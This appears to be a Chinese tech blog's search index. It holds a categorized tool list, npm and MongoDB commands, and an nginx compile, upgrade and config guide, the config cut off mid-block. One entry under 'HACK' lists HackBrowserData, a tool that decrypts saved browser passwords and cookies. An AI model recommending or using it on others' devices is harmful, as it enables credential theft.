configurable components. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:10","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#浏览器插件"},{"categories":["blog"],"content":" 游戏 在线的 web 免费游戏平台 NESBox,源代码在 GitHub - mantou132/nesbox: Online multiplayer games platform 在线玩游戏 https://www.webrcade.com/ 说说你在苹果平台上玩到过的好游戏 - V2EX 跨桌面平台的 ps3 模拟器 GitHub - RPCS3/rpcs3: PS3 emulator/debugger ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:11","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#游戏"},{"categories":["blog"],"content":" 健康 一句话记录热量 App Store 上的“FoodCa- AI加持的食物热量速查与记录工具” 健身动作 Workout.lol | The easiest way to create a workout routine App Store 上的“顶瓜瓜 - 坐姿提醒健康颈椎” (apple.com) ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:12","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#健康"},{"categories":["blog"],"content":" 阅读 hectorqin/reader: 阅读3服务器版，桌面端，iOS可用。后端 Kotlin + Spring Boot + Vert.x + Coroutine ；前端 Vue.js + Element。麻烦点点star，关注一下公众号【假装大佬】❗️ (github.com) tickmao/Novel: 📚 Novle setting | 小说书源及软件整理 爱阅书香 / 阅读 / 香色闺阁 (github.com) gedoor/legado: Legado 3.0 Book Reader with powerful controls \u0026 full functions❤️阅读3.0, 阅读是一款可以自定义来源阅读网络内容的工具，为广大网络文学爱好者提供一种方便、快捷舒适的试读体验。 (github.com) ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:13","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#阅读"},{"categories":["blog"],"content":" HACK moonD4rk/HackBrowserData: Decrypt passwords/cookies/history/bookmarks from the browser. 一款可全平台运行的浏览器数据导出解密工具。 (github.com) ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:14","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#hack"},{"categories":["blog"],"content":" 英语 牛津自然拼读法 多邻国 - 全球数亿语言学习者的口碑选择 很多人在用, 很有名. 可以试试 byoungd/English-level-up-tips: An advanced guide to learn English which might benefit you a lot 🎉 . 离谱的英语学习指南。 (github.com) Call Annie 英语 AI 对话 APP Log In - Pretty Polly 英语 ai 对话学习 GRE 的作用? https://sspai.com/post/83125 我的英语经验心得分享 - 少数派 (sspai.com) 屏幕实时英语翻译 GitHub - Danily07/Translumo: Advanced real-time screen translator for games, hardcoded subtitles in videos, static text and etc. 离线翻译 GitHub - jianchang512/ott: Api tool for local offline text translation supporting multiple languages/支持多语言的本地离线文字翻译api 打字学英语 GitHub - cuixueshe/earthworm: Learning English through the method of constructing sentences with conjunctions ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:15","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#英语"},{"categories":["blog"],"content":" 演示工具 markdown 转 ppt https://sspai.com/post/83232 屏幕分享 GitHub - screego/server: screen sharing for developers https://screego.net/ ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:16","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#演示工具"},{"categories":["blog"],"content":" Web 工具 Connect grpc 的 web 端工具 WhatRuns检测站点用了什么技术 iFrame Resizer V4 | iframe-resizer 嵌入 iframe, 自动设置大小 验证码 Cloudflare is free of CAPTCHAs; Turnstile is free for everyone ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:17","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#web-工具"},{"categories":["blog"],"content":" 分享 方便分发邀请码的网站 博客评论工具 Waline | Waline ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:18","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#分享"},{"categories":["blog"],"content":" 好看/设计 各种开发工具的好看配色 catppuccin/catppuccin: 😸 Soothing pastel theme for the high-spirited! (github.com) 封面图标设计 PHOTORELAY ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:19","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#好看设计"},{"categories":["blog"],"content":" 编程工具 redis 客户端 GitHub - tiny-craft/tiny-rdm: A Modern Redis Desktop Manager, 帖子-V2EX 有永久免费的数据库了 web-ssh 开源工具 GitHub - ekzhang/sshx: Fast, collaborative live terminal sharing over the web 一个 go 写的工具，支持 ftp，sftp ，webdav 等等一些协议。而存储可以用 s 3，或者本地目录。 GitHub - drakkan/sftpgo: Fully featured and highly configurable SFTP server with optional HTTP/S, FTP/S and WebDAV support - S3, Google Cloud Storage, Azure Blob 切换 hosts 文件 GitHub - oldj/SwitchHosts: Switch hosts quickly! 自动拿到 github 的 hosts GitHub - 521xueweihan/GitHub520: :kissing_heart: 让你“爱”上 GitHub，解决访问时图裂、加载慢的问题。（无需安装） ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:20","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#编程工具"},{"categories":["blog"],"content":" ip 信息工具 GitHub - ihmily/ip-info-api: Free IP information query APIs / 免费IP信息查询API接口 IP Guide: Look up IP, Network, and ASN data ip-api GitHub - jason5ng32/MyIP: A better IP Toolbox. Easy to check what’s your IPs, IP informations, check for DNS leaks, examine WebRTC connections, speed test, and test website availability. || 🇨🇳 一个更好的 IP 工具箱。可以查看IP、IP 信息（代理前后）、检查 DNS 泄露、检查 WebRTC 连接、网速测试、测试网站可用性等。 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:21","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#ip-信息工具"},{"categories":["blog"],"content":" 下载 HelloGitHub｜详情 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:22","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#下载"},{"categories":["blog"],"content":" 查询 mac 地址查询厂商和网卡信息 MAC Address Vendor Lookup | MAC Address Lookup (maclookup.app) 行政查询 五级区划查询与下载 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:23","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#查询"},{"categories":["blog"],"content":" 容器/k8s y0ngb1n/dockerized: 这里很多服务都帮你做成了容器化 k9s命令行) 网络排查 nicolaka/netshoot: a Docker + Kubernetes network trouble-shooting swiss-army container (github.com) 免费 k8s, 地址在这里Play with Kubernetes,初始化命令在下面 kubeadm init --apiserver-advertise-address $(hostname -i) --pod-network-cidr 10.5.0.0/16 kubectl apply -f https://raw.githubusercontent.com/cloudnativelabs/kube-router/master/daemonset/kubeadm-kuberouter.yaml kubectl apply -f https://raw.githubusercontent.com/kubernetes/website/master/content/en/examples/application/nginx-app.yaml ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:4:24","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#容器k8s"},{"categories":["blog"],"content":" 对比","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:5:0","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#对比"},{"categories":["blog"],"content":" 手机芯片对比 CPU能效曲线 (socpk.com) ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:5:1","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#手机芯片对比"},{"categories":["blog"],"content":" 参考文档","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:6:0","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#参考文档"},{"categories":["blog"],"content":" 全部 什么是socket Python 的数据分析学习 Python for Data Analysis, 3E chronolaw/annotated的nginx 的源码解读（中文） Nginx开发从入门到精通 — Nginx开发从入门到精通 淘宝的 nginx 讲解 Easy-DotNET 可以用来学习 dotnet Roadmap 合集 Hello 算法 (hello-algo.com) 底层链路到云原生-深入架构原理与实践 计算机体系结构基础 foxsen/archbase: 教科书《计算机体系结构基础》（胡伟武等，第三版）的开源版本 (github.com) 理解 linux 进程 tobegit3hub/understand_linux_process: The open-source ebook of Understand Linux Process (github.com) 谷歌的编程风格指南 Google Style Guides | styleguide ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:6:1","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#全部"},{"categories":["blog"],"content":" Nodejs 简介 | 带你入门前端工程 (woai3c.github.io) 网道 - 互联网开发文档 阮一峰的 js, es, ts, bash ,shell 等等教程 Nodejs 的最佳实践 goldbergyoni/nodebestpractices: :white_check_mark: The Node.js best practices list (July 2023) (github.com) 通过游戏学习 js GitHub - olistic/warriorjs: 🏰 An exciting game of programming and Artificial Intelligence b 站视频尚学堂 前端基础-板斧 uni-app 后管 037_layout组件的静态的搭建_哔哩哔哩_bilibili 还不会用 TS 封装 Axios？我教你啊 - 掘金 手摸手，带你用vue撸后台 系列二(登录权限篇) - 掘金 权限 动态路由前端控制还是后端控制？（附代码） - 掘金 管理后台项目的路由鉴权 - 掘金 基于花裤衩的后台管理系统框架的动态路由渲染方法及步骤 - 掘金 Vue3动态菜单路由核心要点 - 知乎 vue3动态路由 + 菜单栏 - 掘金 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:6:2","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#nodejs-1"},{"categories":["blog"],"content":" 其他编码 学习现代 c++ Learn Modern C++ – Discover a language matched to today’s computing needs 在线学习各种语言 Variables and Types - Learn TypeScript - Free Interactive TypeScript Tutorial 前端面试题大全 GitHub - febobo/web-interview: 语音打卡社群维护的前端面试题库，包含不限于Vue面试题，React面试题，JS面试题，HTTP面试题，工程化面试题，CSS面试题，算法面试题，大厂面试题，高频面试题 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:6:3","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#其他编码"},{"categories":["blog"],"content":" 信息源 字节跳动的前端 github Web Infra (github.com) tg 的阿里云盘群… 获取阿里云盘地址 GitHub - jbranchaud/til: :memo: Today I Learned 散碎的知识点, 有 10 k 以上的 star 知乎技术专栏 - 知乎 为什么这么设计系列文章 - 面向信仰编程 ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:7:0","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#信息源"},{"categories":["point"],"content":"JavaScript 是一门动态编程语言. 要点: 异步 社区非常庞大 浏览器 web 上统一标准 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/js/:0:0","series":null,"tags":["point","js"],"title":"js","uri":"/posts/%E7%AC%94%E8%AE%B0/point/js/#"},{"categories":["point"],"content":" 命令","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/js/:1:0","series":null,"tags":["point","js"],"title":"js","uri":"/posts/%E7%AC%94%E8%AE%B0/point/js/#命令"},{"categories":["point"],"content":" 镜像源 npm config set registry https://registry.npmmirror.com yarn config set registry https://registry.npmmirror.com/ # 加速二进制文件下载 npm i --registry=https://registry.npmmirror.com --disturl=https://npmmirror.com/dist ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/js/:1:1","series":null,"tags":["point","js"],"title":"js","uri":"/posts/%E7%AC%94%E8%AE%B0/point/js/#镜像源"},{"categories":["point"],"content":" 配置缓存npm缓存配置 默认路径 ~/.npm on Posix 或者 %AppData%/npm-cache on Windows # 配置缓存路径 npm config set cache q:\\cache\\js # 或者 setx /M npm_config_cache q:\\cache\\js # 验证命令. 包会存放在配置的路径,而不是默认路径 npm install -g typescript ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/js/:1:2","series":null,"tags":["point","js"],"title":"js","uri":"/posts/%E7%AC%94%E8%AE%B0/point/js/#配置缓存"},{"categories":["point"],"content":"mongodb 是一个文本型数据库. 不同于 mysql 等关系型数据库. 要点: 免费 和 js 匹配度高 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/mongodb/:0:0","series":null,"tags":["point","mongodb"],"title":"mongodb","uri":"/posts/%E7%AC%94%E8%AE%B0/point/mongodb/#"},{"categories":["point"],"content":" 导入导出 # 导出库db_a mongodump -d db_a # 从db_a文件夹导入库 mongorestore -d db_a db_a/ ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/mongodb/:0:1","series":null,"tags":["point","mongodb"],"title":"mongodb","uri":"/posts/%E7%AC%94%E8%AE%B0/point/mongodb/#导入导出"},{"categories":["point"],"content":"nginx 是一个常见的负载均衡服务. 要点: 免费 用户量大, 教程多 性能强大 ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nginx/:0:0","series":null,"tags":["point","nginx"],"title":"nginx","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nginx/#"},{"categories":["blog"],"content":"这里记录 [[笔记/point/nginx|nginx]] 的模块编译和升级操作.","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/","series":null,"tags":["blog","nginx"],"title":"nginx编译和升级","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/"},{"categories":["blog"],"content":" 简介这里记录 nginx 的模块编译和升级操作. ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/:1:0","series":null,"tags":["blog","nginx"],"title":"nginx编译和升级","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/#简介"},{"categories":["blog"],"content":" 编译","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/:2:0","series":null,"tags":["blog","nginx"],"title":"nginx编译和升级","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/#编译"},{"categories":["blog"],"content":" 正常编译装好依赖 后开始编译 # 准备目录 mkdir nginx ; cd nginx # br压缩模块 git clone --recurse-submodules -j8 https://mirror.ghproxy.com/github.com/google/ngx_brotli cd ngx_brotli/deps/brotli mkdir out \u0026\u0026 cd out cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DCMAKE_C_FLAGS=\"-Ofast -m64 -march=native -mtune=native -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" -DCMAKE_CXX_FLAGS=\"-Ofast -m64 -march=native -mtune=native -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" -DCMAKE_INSTALL_PREFIX=./installed .. cmake --build . --config Release --target brotlienc cd ../../../.. export CFLAGS=\"-m64 -march=native -mtune=native -Ofast -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" export LDFLAGS=\"-m64 -Wl,-s -Wl,-Bsymbolic -Wl,--gc-sections\" # 下载,解压 https://nginx.org/en/download.html curl http://nginx.org/download/nginx-1.26.0.tar.gz -o nginx-1.26.0.tar.gz tar -xf nginx-1.26.0.tar.gz cd nginx-1.26.0 # 监控信息 --with-http_stub_status_module # ssl证书 --with-http_ssl_module # tcp代理和tcp代理证书 --with-stream --with-stream_ssl_module # tcp代理的时候，把客户端ip传到PROXY协议的header头部 --with-stream_realip_module和--with-http_realip_module建议开启,虽然我一直用header传输 # 启用http2 --with-http_v2_module ./configure --user=nginx --group=nginx --prefix=/usr/local/nginx --with-http_ssl_module --with-stream --with-stream_ssl_module --with-stream_realip_module --with-http_v2_module --with-http_stub_status_module --add-module=/root/ngx_brotli make \u0026\u0026 make install # 软连接 ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/nginx # 验证 nginx -t # 启动 nginx # 报错 [emerg] getpwnam(\"nginx\") failed useradd -s /bin/false nginx 支持 connection 请求GitHub - chobits/ngx_http_proxy_connect_module: A forward proxy module for CONNECT request handling 作用是支持 connection 请求, 也就是正向代理 # clone到解压后的nginx目录 git clone https://github.com/chobits/ngx_http_proxy_connect_module.git patch -p1 \u003c ngx_http_proxy_connect_module/patch/proxy_connect_rewrite_102101.patch # 加入编译module --add-module=ngx_http_proxy_connect_module 第三方模块调试 # 下载tengine https://tengine.taobao.org/download_cn.html curl https://tengine.taobao.org/download/tengine-3.0.0.tar.gz -o tengine-3.0.0.tar.gz tar xf tengine-3.0.0.tar.gz # 加入tengine的内存调试模块 ./configure ... --add-module=/root/nginx/tengine-3.0.0/modules/ngx_debug_pool ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/:2:1","series":null,"tags":["blog","nginx"],"title":"nginx编译和升级","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/#正常编译"},{"categories":["blog"],"content":" 正常编译装好依赖 后开始编译 # 准备目录 mkdir nginx ; cd nginx # br压缩模块 git clone --recurse-submodules -j8 https://mirror.ghproxy.com/github.com/google/ngx_brotli cd ngx_brotli/deps/brotli mkdir out \u0026\u0026 cd out cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DCMAKE_C_FLAGS=\"-Ofast -m64 -march=native -mtune=native -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" -DCMAKE_CXX_FLAGS=\"-Ofast -m64 -march=native -mtune=native -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" -DCMAKE_INSTALL_PREFIX=./installed .. cmake --build . --config Release --target brotlienc cd ../../../.. export CFLAGS=\"-m64 -march=native -mtune=native -Ofast -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" export LDFLAGS=\"-m64 -Wl,-s -Wl,-Bsymbolic -Wl,--gc-sections\" # 下载,解压 https://nginx.org/en/download.html curl http://nginx.org/download/nginx-1.26.0.tar.gz -o nginx-1.26.0.tar.gz tar -xf nginx-1.26.0.tar.gz cd nginx-1.26.0 # 监控信息 --with-http_stub_status_module # ssl证书 --with-http_ssl_module # tcp代理和tcp代理证书 --with-stream --with-stream_ssl_module # tcp代理的时候，把客户端ip传到PROXY协议的header头部 --with-stream_realip_module和--with-http_realip_module建议开启,虽然我一直用header传输 # 启用http2 --with-http_v2_module ./configure --user=nginx --group=nginx --prefix=/usr/local/nginx --with-http_ssl_module --with-stream --with-stream_ssl_module --with-stream_realip_module --with-http_v2_module --with-http_stub_status_module --add-module=/root/ngx_brotli make \u0026\u0026 make install # 软连接 ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/nginx # 验证 nginx -t # 启动 nginx # 报错 [emerg] getpwnam(\"nginx\") failed useradd -s /bin/false nginx 支持 connection 请求GitHub - chobits/ngx_http_proxy_connect_module: A forward proxy module for CONNECT request handling 作用是支持 connection 请求, 也就是正向代理 # clone到解压后的nginx目录 git clone https://github.com/chobits/ngx_http_proxy_connect_module.git patch -p1 \u003c ngx_http_proxy_connect_module/patch/proxy_connect_rewrite_102101.patch # 加入编译module --add-module=ngx_http_proxy_connect_module 第三方模块调试 # 下载tengine https://tengine.taobao.org/download_cn.html curl https://tengine.taobao.org/download/tengine-3.0.0.tar.gz -o tengine-3.0.0.tar.gz tar xf tengine-3.0.0.tar.gz # 加入tengine的内存调试模块 ./configure ... --add-module=/root/nginx/tengine-3.0.0/modules/ngx_debug_pool ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/:2:1","series":null,"tags":["blog","nginx"],"title":"nginx编译和升级","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/#支持-connection-请求"},{"categories":["blog"],"content":" 正常编译装好依赖 后开始编译 # 准备目录 mkdir nginx ; cd nginx # br压缩模块 git clone --recurse-submodules -j8 https://mirror.ghproxy.com/github.com/google/ngx_brotli cd ngx_brotli/deps/brotli mkdir out \u0026\u0026 cd out cmake -DCMAKE_BUILD_TYPE=Release -DBUILD_SHARED_LIBS=OFF -DCMAKE_C_FLAGS=\"-Ofast -m64 -march=native -mtune=native -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" -DCMAKE_CXX_FLAGS=\"-Ofast -m64 -march=native -mtune=native -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" -DCMAKE_INSTALL_PREFIX=./installed .. cmake --build . --config Release --target brotlienc cd ../../../.. export CFLAGS=\"-m64 -march=native -mtune=native -Ofast -flto -funroll-loops -ffunction-sections -fdata-sections -Wl,--gc-sections\" export LDFLAGS=\"-m64 -Wl,-s -Wl,-Bsymbolic -Wl,--gc-sections\" # 下载,解压 https://nginx.org/en/download.html curl http://nginx.org/download/nginx-1.26.0.tar.gz -o nginx-1.26.0.tar.gz tar -xf nginx-1.26.0.tar.gz cd nginx-1.26.0 # 监控信息 --with-http_stub_status_module # ssl证书 --with-http_ssl_module # tcp代理和tcp代理证书 --with-stream --with-stream_ssl_module # tcp代理的时候，把客户端ip传到PROXY协议的header头部 --with-stream_realip_module和--with-http_realip_module建议开启,虽然我一直用header传输 # 启用http2 --with-http_v2_module ./configure --user=nginx --group=nginx --prefix=/usr/local/nginx --with-http_ssl_module --with-stream --with-stream_ssl_module --with-stream_realip_module --with-http_v2_module --with-http_stub_status_module --add-module=/root/ngx_brotli make \u0026\u0026 make install # 软连接 ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/nginx # 验证 nginx -t # 启动 nginx # 报错 [emerg] getpwnam(\"nginx\") failed useradd -s /bin/false nginx 支持 connection 请求GitHub - chobits/ngx_http_proxy_connect_module: A forward proxy module for CONNECT request handling 作用是支持 connection 请求, 也就是正向代理 # clone到解压后的nginx目录 git clone https://github.com/chobits/ngx_http_proxy_connect_module.git patch -p1 \u003c ngx_http_proxy_connect_module/patch/proxy_connect_rewrite_102101.patch # 加入编译module --add-module=ngx_http_proxy_connect_module 第三方模块调试 # 下载tengine https://tengine.taobao.org/download_cn.html curl https://tengine.taobao.org/download/tengine-3.0.0.tar.gz -o tengine-3.0.0.tar.gz tar xf tengine-3.0.0.tar.gz # 加入tengine的内存调试模块 ./configure ... --add-module=/root/nginx/tengine-3.0.0/modules/ngx_debug_pool ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/:2:1","series":null,"tags":["blog","nginx"],"title":"nginx编译和升级","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/#第三方模块调试"},{"categories":["blog"],"content":" 升级 # 下载,解压 curl http://nginx.org/download/nginx-1.26.0.tar.gz -o ~/nginx-1.26.0.tar.gz tar xf ~/nginx-1.26.0.tar.gz # nginx -V查看现有配置，然后到新版本nginx目录下执行同样配置 ./configure 编译参数(configure-arguments) # 编译 make # 备份一下 cp /usr/local/nginx/sbin/nginx nginx.bak # 停老版本nginx nginx -s stop # 替换文件 cp objs/nginx /usr/local/nginx/sbin/nginx # 测试是否正常 nginx -t # 启动新版本nginx nginx ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/:3:0","series":null,"tags":["blog","nginx"],"title":"nginx编译和升级","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E7%BC%96%E8%AF%91%E5%92%8C%E5%8D%87%E7%BA%A7/#升级"},{"categories":["blog"],"content":"[[笔记/point/nginx|nginx]] 的配置示例. 文档中的配置文件, 目录结构最好结合 nginx编译和升级 使用.","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/"},{"categories":["blog"],"content":" 简介nginx 的配置示例, 文档中的配置文件, 目录结构最好结合 nginx编译和升级 使用. ","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:1:0","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#简介"},{"categories":["blog"],"content":" 基础配置","date":"2023-07-06","objectID":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/:2:0","series":null,"tags":["blog","nginx"],"title":"nginx配置","uri":"/posts/%E7%AC%94%E8%AE%B0/nginx%E9%85%8D%E7%BD%AE/#基础配置"},{"categories":["blog"],"content":" nginx.conf 主配置 日志格式解析可以参考 jq 处理 json # user nobody; # 默认进入守护进程 daemon on; 这样就可以forking模式启动. # 默认打开 master_process on; 这样会创建worker进程. 这是一个开发人员选项,如果off将只存在master进程处理 worker_processes auto; worker_cpu_affinity auto; error_log /data/logs/nginx-error.log; pid /run/nginx.pid; worker_rlimit_nofile 65535; # 解决nginx-worker一直不退出的情况, worker process is shutting down # 需要重启nginx生效 worker_shutdown_timeout 5s; events { use epoll; worker_connections 65535; } ## tcp代理参考 stream { upstream service-a { hash $remote_addr consistent; server 1.1.1.1:222; } server { listen 